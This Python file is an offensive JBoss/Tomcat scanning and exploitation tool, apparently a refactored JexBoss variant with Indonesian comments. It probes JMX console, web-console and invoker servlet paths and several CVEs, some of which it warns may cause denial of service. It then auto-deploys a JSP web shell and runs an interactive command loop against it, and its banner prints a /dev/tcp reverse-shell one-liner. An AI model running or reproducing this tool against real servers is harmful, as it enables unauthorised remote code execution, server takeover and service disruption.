#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Sincan2: Sincan2 verify and EXploitation Tool (MODULAR & INTERACTIVE SHELL VERSION)
Original: https://github.com/sincan2
"""
import textwrap
import traceback
import logging
import datetime
import signal
import _exploits
import _updates
from os import name, system
import os, sys
from time import sleep
from random import randint
import argparse, socket
from sys import argv, exit, version_info
from urllib.parse import quote_plus
import warnings # For suppressing InsecureRequestWarning

# Suppress InsecureRequestWarning from requests and urllib3
try:
    import requests
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass # Handled later, but suppress if requests is available

try:
    from urllib3.exceptions import InsecureRequestWarning
    warnings.filterwarnings("ignore", category=InsecureRequestWarning)
except ImportError:
    pass # Handled later

# Setup logging
logging.captureWarnings(True)
FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
logging.basicConfig(filename='hasil_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)

__author__ = "João Filho Matos Figueiredo (Original), Sincan2 (Refactoring)"
__version__ = "3.0.0 (Interactive Shell)"

# Definisi warna
RED = '\x1b[91m'
RED1 = '\033[31m'
BLUE = '\033[94m'
GREEN = '\033[32m'
BOLD = '\033[1m'
NORMAL = '\033[0m'
ENDC = '\033[0m'

# Import pustaka modern
try:
    from urllib3.util import parse_url, Timeout
    from urllib3 import PoolManager, ProxyManager, make_headers
    from urllib3.exceptions import MaxRetryError, NewConnectionError, ReadTimeoutError
except ImportError:
    print(f"{RED1}{BOLD}\n * Pustaka 'urllib3' tidak ditemukan. Silakan install dengan 'pip install urllib3'.\n{ENDC}")
    exit(1)

try:
    import requests
except ImportError:
    print(f"{RED1}{BOLD}\n * Pustaka 'requests' tidak ditemukan. Silakan install dengan 'pip install requests'.\n{ENDC}")
    exit(1)

# Variabel Global
gl_interrupted = False
gl_args = None
gl_http_pool = None

def print_and_flush(message, same_line=False):
    """Fungsi print yang kompatibel dengan Python 2/3 dan melakukan flush."""
    print(message, end='' if same_line else '\n', flush=True)

def get_random_user_agent():
    """Menyediakan User-Agent modern secara acak."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    ]
    return user_agents[randint(0, len(user_agents) - 1)]

def configure_http_pool():
    """Mengonfigurasi koneksi HTTP Pool berdasarkan argumen."""
    global gl_http_pool
    timeout = Timeout(connect=gl_args.timeout, read=gl_args.timeout * 2)
    # PERBAIKAN: Menghapus argumen 'assert_hostname=False' yang menyebabkan TypeError
    if gl_args.proxy:
        gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE')
    else:
        gl_http_pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
    
    # Memastikan warning InsecureRequestWarning dari urllib3 tetap disembunyikan
    warnings.filterwarnings("ignore", category=InsecureRequestWarning)


def handler_interrupt(signum, frame):
    """Menangani interupsi Ctrl+C."""
    global gl_interrupted
    gl_interrupted = True
    print_and_flush("\nProses dihentikan oleh pengguna...")
    exit(1)

signal.signal(signal.SIGINT, handler_interrupt)

# --- FUNGSI DARI INTERACT_SHELL.PY DIGABUNGKAN DI SINI ---

def print_shell_banner(url):
    """Menampilkan banner informasi shell."""
    print(f"\n{BOLD}{GREEN}╔════════════════════════════════════════════════════════════╗")
    print(f"║       Sincan2 Interactive Shell                                ║")
    print(f"╠════════════════════════════════════════════════════════════╣")
    print(f"║ {BLUE}Target Shell:{ENDC} {url.ljust(52)}║")
    print(f"║ {BLUE}Ketik Perintah:{ENDC} 'id', 'ls -la', 'whoami', dll.                   ║")
    print(f"║ {BLUE}Untuk Keluar:{ENDC}   Ketik 'exit' atau 'keluar'                      ║")
    print(f"║ {BLUE}JexRemote:{ENDC}      jexremote=IPMU:PORT                           ║")
    print(f"║ {BLUE}Reverse Shell:{ENDC}  /bin/bash -i > /dev/tcp/IPMU/PORT 0>&1 2>&1   ║")
    print(f"{BOLD}{GREEN}╚════════════════════════════════════════════════════════════╝{ENDC}\n")


def parse_shell_output(raw_text):
    """Mencoba mem-parsing output mentah dari web shell."""
    try:
        # Mencari output di antara tag <pre> atau <body>, lebih fleksibel
        if '<pre>' in raw_text:
            output = raw_text.split('<pre>')[1].split('</pre>')[0]
        elif '<body>' in raw_text:
            output = raw_text.split('<body>')[1].split('</body>')[0]
        else:
            output = raw_text
        return output.strip()
    except IndexError:
        return raw_text.strip()
    except Exception:
        return "Gagal mem-parsing output dari server."


def shell_loop(base_url):
    """Memulai loop shell interaktif."""
    print_shell_banner(base_url)
    session = requests.Session()
    session.verify = False # Ensure requests session also ignores SSL errors

    while True:
        try:
            command = input(f"{BOLD}{BLUE}Sincan2 > {ENDC}")
            if command.lower().strip() in ['exit', 'keluar']:
                break
            if not command.strip():
                continue

            encoded_command = quote_plus(command)
            # Menentukan cara penambahan parameter berdasarkan URL
            separator = '&' if '?' in base_url else '?'
            target_url = f"{base_url}{separator}ppp={encoded_command}"
            
            response = session.get(target_url, timeout=30, verify=False)

            if response.status_code == 200:
                cleaned_output = parse_shell_output(response.text)
                print(cleaned_output)
            else:
                print(f"{RED}Error: Server merespons dengan status {response.status_code}{ENDC}")

        except requests.exceptions.RequestException as e:
            print(f"{RED}Error koneksi: {e}{ENDC}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"{RED}Terjadi error tak terduga: {e}{ENDC}")

    print(f"\n{GREEN}Sesi shell dihentikan. Kembali ke program utama...{ENDC}")


# --- FUNGSI UTAMA Sincan2 ---

def check_vul(url):
    """Fungsi utama untuk memeriksa semua vektor kerentanan."""
    url_check = parse_url(url)
    if not url_check.scheme:
        url = "http://" + url

    print_and_flush(GREEN + f"\n ** Memeriksa Host: {url} **\n" + ENDC)

    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}
    paths = {
        "sincan2-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
        "web-console": "/web-console/ServerInfo.jsp",
        "Sincan2InvokerServlet": "/invoker/JMXInvokerServlet"
    }

    if gl_args.scan_modern_vulns:
        print_and_flush(BLUE + "[INFO] Menambahkan Pengecekan Vektor Modern..." + ENDC)
        paths["ROP PELOR Memory Leak (CVE-2022-0853)"] = ""
        paths["Undertow AJP Overflow (CVE-2023-5379)"] = ""
        paths["Undertow FormAuth DoS (CVE-2023-1973)"] = ""
        paths["Spoofed Data Bypass (CVE-2023-6236)"] = ""
        paths["Apache Tomcat Path Traversal (CVE-2025-24813)"] = "" # Nama diperbarui

    results = {}
    for vector, path in paths.items():
        if gl_interrupted: break
        print_and_flush(GREEN + f" [*] Memeriksa {vector:<45}" + ENDC, same_line=True)
        try:
            if "CVE-" in vector:
                if "CVE-2022-0853" in vector: res = _exploits.test_jta_loop(url, headers)
                elif "CVE-2023-5379" in vector: res = _exploits.send_ajp_oversize_header(url, headers)
                elif "CVE-2023-1973" in vector: res = _exploits.post_large_form(url, headers)
                elif "CVE-2023-6236" in vector: res = _exploits.send_spoofed_data(url, headers)
                elif "CVE-2025-24813" in vector: res = _exploits.exploit_tomcat_cve_2025_24813(url, headers)
                
                if res['status'] == 'vulnerable':
                    print_and_flush(RED + f"  [ RENTAN ]" + ENDC)
                    results[vector] = 200 # Rentan
                elif res['status'] in ['timeout', 'connection_error', 'failed_put', 'failed_get', 'error']:
                    print_and_flush(RED + f"  [ GAGAL / ERROR ]" + ENDC)
                    results[vector] = 505 # Error
                else:
                    print_and_flush(GREEN + "  [ OK ]" + ENDC)
                    results[vector] = 404 # Tidak Rentan
            else:
                r = gl_http_pool.request('HEAD', url + path, headers=headers)
                if r.status in [200, 500]:
                    print_and_flush(RED + "  [ RENTAN ]" + ENDC)
                    results[vector] = 200
                else:
                    print_and_flush(GREEN + "  [ OK ]" + ENDC)
                    results[vector] = 404
        except Exception as e:
            print_and_flush(RED + f"\n [ * ] Terjadi error saat memeriksa {vector}: {e}\n" + ENDC)
            traceback.print_exc()
            results[vector] = 505
    return results

def auto_exploit(url, vector):
    """
    Memilih dan menjalankan fungsi eksploitasi, lalu masuk ke shell interaktif jika berhasil.
    """
    print_and_flush(GREEN + f"\n [ + ] Mencoba eksploitasi otomatis via {vector}. Mohon tunggu..." + ENDC)

    success = False
    shell_path = "/jexws4/jexws4.jsp" # Default shell path

    if vector == "sincan2-console":
        success = _exploits.exploit_jmx_console_file_repository(url)
        if not success:
            success = _exploits.exploit_jmx_console_main_deploy(url)
    elif vector == "web-console":
        success = _exploits.exploit_web_console_invoker(url)
    elif vector == "Sincan2InvokerServlet":
        shell_path = "/jexinv4/jexinv4.jsp"
        success = _exploits.exploit_jmx_invoker_file_repository(url)

    if success:
        print_and_flush(GREEN + f" [ SUCCESS ] Kode berhasil di-deploy! Shell tersedia di {shell_path}" + ENDC)
        parsed_url = parse_url(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        full_shell_url = base_url + shell_path
        # Masuk ke loop shell interaktif
        shell_loop(full_shell_url)
        return True
    else:
        print_and_flush(RED + " [ FAILED ] Gagal mengeksploitasi via vektor ini."+ ENDC)
        return False

def banner():
    """Menampilkan banner."""
    system('cls' if os.name == 'nt' else 'clear')
    print_and_flush(RED1 + "\n * --- Verify and EXploitation Tool (MOD v3.0) --- *\n"
                      " |       Versi Interaktif & Gabungan Penuh         |\n"
                      " |                                                 |\n"
                      " | @author:  MHL TEam                                |\n"
                      " | @refactor: Sincan2 (2025)                         |\n"
                      " #__________________________________________________#\n" + ENDC)

if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Sincan2 v3.0 (Interactive) - Alat verifikasi dan eksploitasi Sincan2.",
        epilog=f"Contoh Penggunaan:\n"
               f"  python {argv[0]} -u http://target.com:8080\n"
               f"  python {argv[0]} -u https://target.com -M --auto-exploit"
    )

    parser.add_argument("-u", "--host", dest="host", required=True, help="Host target (contoh: http://127.0.0.1:8080)")
    parser.add_argument("--proxy", help="Gunakan proxy HTTP (contoh: http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=10, help="Waktu tunggu koneksi dalam detik (default: 10)")
    parser.add_argument("--auto-exploit", action="store_true", help="Coba eksploitasi otomatis dan buka shell interaktif jika berhasil.")

    group_modern = parser.add_argument_group('Opsi Pengecekan Modern')
    group_modern.add_argument("-M", "--scan-modern-vulns", action='store_true',
                              help="Jalankan modul pengecekan modern (CVE 2022-2025). PERINGATAN: Berpotensi DoS.")

    gl_args = parser.parse_args()

    configure_http_pool()
    _exploits.set_http_pool(gl_http_pool)
    _updates.set_http_pool(gl_http_pool)

    scan_results = check_vul(gl_args.host)

    vulnerables = [k for k, v in scan_results.items() if v == 200]

    if not vulnerables:
        print_and_flush(GREEN + "\n[+] Selesai. Tidak ada kerentanan yang jelas ditemukan." + ENDC)
    else:
        print_and_flush(RED + f"\n[!] Ditemukan potensi kerentanan pada: {', '.join(vulnerables)}" + ENDC)
        if gl_args.auto_exploit:
            exploited = False
            for vector in vulnerables:
                if exploited: break
                
                # --- Logika auto-exploit yang telah diperbarui ---
                if "CVE-2025-24813" in vector:
                    # Eksploitasi sudah dilakukan saat check_vul. Sekarang kita langsung buka shell.
                    print_and_flush(GREEN + f"\n [ + ] RCE via {vector} berhasil. Membuka shell interaktif..." + ENDC)
                    parsed_url = parse_url(gl_args.host)
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                    full_shell_url = base_url + "/mhl.jsp"
                    shell_loop(full_shell_url)
                    exploited = True
                
                elif "CVE" not in vector:
                    # Coba eksploitasi untuk vektor klasik
                    if auto_exploit(gl_args.host, vector):
                        exploited = True # Berhasil, hentikan loop
                
            if exploited:
                print_and_flush(BOLD + GREEN + "\n[!!!] Eksploitasi Berhasil! Sesi shell interaktif ditutup." + ENDC)

        else:
            print_and_flush(BLUE + "\n[INFO] Jalankan kembali dengan flag --auto-exploit untuk mencoba eksploitasi dan mendapatkan shell." + ENDC)

